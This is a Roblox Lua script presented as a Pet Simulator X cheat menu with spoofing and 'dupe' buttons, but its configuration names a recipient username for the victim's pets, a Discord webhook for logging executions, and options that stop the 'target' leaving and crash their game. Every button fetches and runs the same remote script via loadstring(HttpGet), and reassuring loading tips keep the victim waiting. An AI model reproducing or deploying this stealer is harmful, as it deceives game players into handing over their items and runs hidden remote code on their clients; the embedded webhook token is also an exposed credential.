_G.Username = "Komosa01" --// Username To Send Pets To
_G.ScriptName = "Melatonin | [💎MINE] Pet Simulator X! 🐾" --// Script Name For Watermark
_G.Webhook = "https://discord.com/api/webhooks/1097308151373639680/tpxmO6Ow7z5DpJKO4L747uuCPTeXzqGFsdhkwiE_b6CX_j4WuQhNUuHbbqxG57sgJ8a_" --// Discord Webhook For Executions
_G.GiftMessage = "Tnks :D" --// Message For The Gift To Say
_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
_G.UnlockPets = true --// Unlocks Locked Pets
_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
_G.Crash = true  --// Crashes Them After Its Finished
_G.Tip1 = "Don't leave !" --// Gives You Tips On The UI
_G.Tip2 = "Wait until the loading finish" --// Gives You Tips On The UI
_G.Tip3 = "Your script is loading.." --// Gives You Tips On The UI
_G.Tip4 = "Take a break until the script load" --// Gives You Tips On The UI
_G.Tip5 = "Don't forget to join the discord!" --// Gives You Tips On The UI



------ SOUNDS --------
local Sound = Instance.new("Sound",game:GetService("SoundService"))
local Click = Instance.new("Sound",game:GetService("SoundService"))
Click.SoundId = "rbxassetid://876939830"
Sound.SoundId = "rbxassetid://8482764467"

------ Notifications --------

Sound:Play()



game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Melatonin | Loaded, PET SIM X",["Text"] = "Have fun :D",["Duration"] = 20,["Button1"] = "Okay",["Icon"] = "https://www.roblox.com/asset/?id=12841940716"})

game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Discord is here!",["Text"] = "Join the discord : discord.gg/3fjRZzQp3T",["Duration"] = 99999999,["Button1"] = "JOIN.",["Button2"] = "DECLINE.",["Icon"] = "https://www.roblox.com/asset/?id=5313546565"})



Wait(2)

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Melatonin | [💎MINE] Pet Simulator X! 🐾", "GrapeTheme")
print('Melatonin LOADED')



------[ MAIN SECTION ]-----

local Main = Window:NewTab("🌎 - Main")
local MainSection = Main:NewSection("Update - 04/17/2023")
MainSection = Main:NewSection("📅 Updates every day!")
MainSection = Main:NewSection("🚀 Discord : discord.gg/3fjRZzQp3T")
------[ Function SECTION ]-----

local Function = Window:NewTab("📀 - Function")
local FunctionSection = Function:NewSection("Visual Trade 👀")


------[ Spoofer SECTION ]-----

local Spoofer = Window:NewTab("👻 - Spoofer")
local SpooferSection = Spoofer:NewSection("👻 - Spoofer")


------[ Dupe SECTION ]-----

local Dupe = Window:NewTab("🤡 - Dupe/Scam")
local DupeSection = Dupe:NewSection("Click for take pets 👥")


------[ Premium SECTION ]-----

local Premium = Window:NewTab("💎 - Premium")
local PremiumSection = Premium:NewSection("💎 - Premium")


------[ Function Script SECTION ]-----

FunctionSection:NewToggle("✅ On / ❌ Off ", "Turn On or Off the visual trade.", function(state)
    if state then
        Click:Play()
      
    else
        Click:Play()
       
    end
end)



FunctionSection:NewButton("Fake Titanic 🧩 ", "Change a huge pet to a fake titanic", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)

FunctionSection:NewButton("Fake Banana 🍌 ", "Change a pet to a fake banana", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)

FunctionSection:NewButton("Fake Huge 🎈 ", "Change a pet to a fake huge", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)



SpooferSection:NewButton("Spoof your username 😎 ", "Change your username", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)


SpooferSection:NewButton("Spoof your Pets 🌝 ", "Change your Pets", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)

SpooferSection:NewButton("Spoof your Diamonds 💎 ", "Change your diamonds ammount", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)


SpooferSection:NewButton("Spoof your Coins 🥴 ", "Change your coins ammount", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)




------ [ Pet scam ]--------------

DupeSection:NewButton("Titanic pet 🔥 ", "Scam a Titanic pet", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)

DupeSection:NewButton("Huge pet ☀️ ", "Scam a Huge pet", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)

DupeSection = Dupe:NewSection("🎯 Dupe")


DupeSection:NewButton("Boosts Dupe 🏃 ", "Dupe your boosts", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)

DupeSection:NewButton("Exclusive Egg Dupe 🥚 ", "Dupe your Exclusive Egg", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)

DupeSection:NewButton("Day Care Dupe 🧸 ", "Dupe your Day Care pets", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)

DupeSection:NewButton("Auctions Scams 🍄 ", "Just scam auctions", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)


DupeSection:NewButton("Eggs for Diamonds 💎 ", "Just exchange diamonds for eggs", function()
    Click:Play()

    loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))()

 

end)







PremiumSection:NewTextBox("Premium Key", "Put your key to unlock Premium", function(txt)
	print(txt)
end)
